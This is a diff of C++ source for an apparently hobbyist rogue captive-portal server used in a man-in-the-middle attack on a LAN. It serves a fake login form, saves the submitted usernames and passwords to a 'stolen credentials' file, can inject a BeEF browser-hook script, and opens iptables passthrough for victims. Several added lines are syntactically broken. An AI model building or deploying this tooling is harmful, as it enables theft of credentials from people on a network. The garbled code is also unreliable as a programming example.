@@ -1,6 +1,5 @@
 #include <boost/program_options.hpp>
 #include <boost/algorithm/string.hpp>
-#include <boost/filesystem.hpp>
 #include <boost/network/uri.hpp>
 #include <httpserver.hpp>
 #include "everythingelse.hpp"
@@ -10,7 +9,7 @@
 
 // I used : google, stackexchange, official reference documentation, code examples.
 
-//g++ ./main.cpp -o ./main.o -L/usr/include/boost/program_options.hpp -lboost_program_options -lboost_system -lboost_filesystem -lhttpserver -lpthread -lcurses
+//g++ ./main.cpp ./auth.cpp ./curses.cpp ./extra_functions.cpp -o ./main.o -L/usr/include/boost/program_options.hpp -lboost_program_options -lboost_system -lboost_filesystem -lhttpserver -lpthread -lcurses -lopenssl
 
 // reemember, if youre getting library errors, you might need to check the linker options
 // if youre getting syntax errors, you might want to check the code,
@@ -25,44 +24,22 @@ namespace url_parse  = boost::network::uri;
 int row = 0, col = 0;
 int init_display_height;
 int init_display_width;
-bool INPUT_FLAG = true;
 bool hook;
+bool PORTAL;
 int PORT;
+bool curses  == true;
 std::string  credentials_file;
 //std::vector[] username_password_pair;
 //std::string username_password_array[];
 
 std::string document_root;
 std::vector<string> hostslist;
-std::string html_redirect_body;
-std::string html_form_body;
 std::string hook_location;
 std::string redirect_ip;
 std::string remote_ip;
 std::string beef_hook;
 std::string addr;
 std::string iface;
-
-
-void make_html(std::string hook_loc, std::string formaction) {
-    std::string html_login_head ="<!DOCTYPE html><html><head><meta charset=\"utf-8\" /><title></title></head>";
-    std::string html_form_body_top = "<body><form class=\"login\" ";
-    std::string form_action = "action=\"" + formaction + "\" ";
-    std::string html_form_body_bottom = " method=\"post\">\
-        <input type=\"text\" name=\"username\" value=\"username\">\
-        <input type=\"text\" name=\"password\" value=\"password\">\
-        <input type=\"submit\" name=\"submit\" value=\"submit\">\
-        </form>\
-        </body>\
-        </html>";
-    std::string html_redirect_head = "<html><head>";
-    beef_hook = "<script src=" + hook_loc + "></script>";
-    std::string html_redirect_middle = "<meta http-equiv=\"refresh\" content=\"0; url=http://" + redirect_ip + "\" />";
-    std::string redirect_bottom = "</head><body><b>Redirecting to MITM hoasted captive portal page</b></body></html>";
-    html_redirect_body = html_redirect_head + beef_hook + html_redirect_middle + redirect_bottom;
-    html_form_body = html_login_head + html_form_body_top + form_action + html_form_body_bottom;
-};
-
 
 int parse_commandline(int argc, char* argv[]){
     options::options_description desc("Captive portal server");
@@ -71,10 +48,12 @@ int parse_commandline(int argc, char* argv[]){
         ("address,a", options::value<std::string >()->default_value("192.168.0.1"), "IP address to use (this is the router on the LAN, Were doing an MITM!)" )
         ("port,p", options::value<int>()->default_value(80), "port to serve the portal on")
         ("Iface,i", options::value< std::string >()->default_value("eth0"), "Interface to use, must be capable of monitor mode." )
-        ("beef-hook,b", options::value< std::string >()->default_value("false"), "Trigger for beef" )
         ("credentials,c", options::value<std::string>()->default_value("credentials.txt"), "Filename to save the stolen credentials to")
-        ("external-html,e", options::value<std::string>()->default_value("false"), "switch for serving external document instead of internal form. type 'true' OR NOTHING")
         ("document-root,d", options::value<std::string>()->default_value("/"), "Document root of the server ")
+        ("external-html,e","switch for serving external document instead of internal form")
+        ("curses", "Interactive curses interface, lets you pretend you're a hacker")
+        ("beef-hook,b", "Trigger for beef" )
+        ("portal,c", "Trigger to actually implement the redirect" )
 
     ;
     options::variables_map arguments;
@@ -90,14 +69,17 @@ int parse_commandline(int argc, char* argv[]){
         cout << desc << "\n";
         return 1;
     };
-    if (arguments.count("beef-hook") == 'true') {
+    if (arguments.count("portal")) {
+        PORTAL = true;
+    };
+    if (arguments.count("beef-hook")) {
         hook_location = arguments["address"].as<std::string>();
         hook_location = hook_location + ":3000";
         system("service beef start");
     } else {
         hook_location = "";
     };
-    if (arguments.count("external-html") == 'true') {
+    if (arguments.count("external-html")) {
         //auto pwd = filesystem::current_path();
         //document_root = pwd + arguments
     };
@@ -109,22 +91,46 @@ int parse_commandline(int argc, char* argv[]){
     addr = arguments["address"].as<std::string>();
 };
 
+/**
+HTML responder resource dictating the behavior of the redirect thereby establshing this as a
+captive portal. it has to redirect all unauthenticated requests to the /login resource for auth
+
+usually, the expected behavior is to issue a GET request to document_root, which is what this class
+responds to with a string containing redirect HTML.
+
+typically, you need to MITM to get the GET or, legally, be the owner of the network. This class doesn't care
+
+*/
 class CaptivePortal : public http_resource {
 public:
     const std::shared_ptr<http_response> render_GET(const http_request& request) {
-        termcolorprint("yellow", ("redirecting %remoteip to portal", request.get_requestor()));
+        if (curses == true) {
+            std::string message("redirecting %remoteip to portal", request.get_requestor())
+            update_window(stdscr, message)
+        } else if (curses == false) {
+            termcolorprint("yellow", ("redirecting %remoteip to portal", request.get_requestor()));
+        }
         return std::shared_ptr<http_response>(new string_response(html_redirect_body));
     };
+};
 
+/**
+HTML responder resource dictating the behavior of the /login
+
+*/
+class Login : public http_resource {
+public:
+    const std::shared_ptr<http_response> render_GET(const http_request& request) {
+        std::string html_form_body = make_html(hook_location, addr, true);
+        return std::shared_ptr<http_response>(new string_response(html_form_body));
+
+    };
     const std::shared_ptr<http_response> render_POST(const http_request& request) {
         remote_ip = request.get_requestor();
-
-        authpassthrough(remote_ip);
         termcolorprint("green", ("Host %host Authorized", remote_ip));
         save_credentials(request.get_user(), request.get_pass());
         return std::shared_ptr<http_response>(new string_response("you may now browse freely, I stole your password!"));
     };
-
     void authpassthrough(std::string remoteip){
         system(("iptables -t nat -I PREROUTING 1 -s $remoteip -j ACCEPT", remoteip).c_str());
         system(("iptables -I FORWARD -s %remoteip-j ACCEPT", remoteip).c_str());
@@ -146,30 +152,35 @@ public:
             return 1;
         };
     };
-
 };
 
-class Login : public http_resource {
-public:
-    const std::shared_ptr<http_response> render_GET(const http_request& request) {
-        make_html(hook_location, addr);
-        return std::shared_ptr<http_response>(new string_response(html_form_body));
+/**
+returns a string containing the html needed to make wither a redirect or form with
+ beefhook location and formaction as the first and second parameters respectively.
+ both strings;
+ @param power_switch turns the server on or off
+ @param PORTAL turns he portal on or off
 
+*/
+void start_stop_server(bool power_switch, bool ){
+    case (power_switch) {
+        switch true :
+            webserver server = create_webserver(PORT);
+            if (PORTAL == true){
+                CaptivePortal captiveportal;
+                Login login;
+                server.register_resource(document_root, &captiveportal);
+                server.register_resource("/login", &login);
+                server.start(true);
+            } else if (PORTAL == false) {
+                Login login;
+                //server.register_resource(document_root, &captiveportal);
+                server.register_resource("/login", &login);
+                server.start(true);
+            };
+        switch false:
+            shutdown_server();
     };
-};
-
-
-void start_server(bool power_switch){
-    if (power_switch == true){
-    webserver server = create_webserver(PORT);
-    CaptivePortal captiveportal;
-    Login login;
-    server.register_resource(document_root, &captiveportal);
-    server.register_resource("/login", &login);
-    server.start(true);
-    } else if (power_switch == false) {
-        shutdown_server();
-    }
 
 };
 
@@ -193,9 +204,8 @@ int main(int argc, char* argv[]) {
     keypad(stdscr, TRUE);
     refresh();
     fflush(stdin);
-    INPUT_FLAG = true;
     scrollok(stdscr, true);
-    output_window = newpad(2046, init_display_width);
+    //output_window = newpad(2046, init_display_width);
     wprintw(stdscr, "test");
 
     //scrollok(output_window, true);
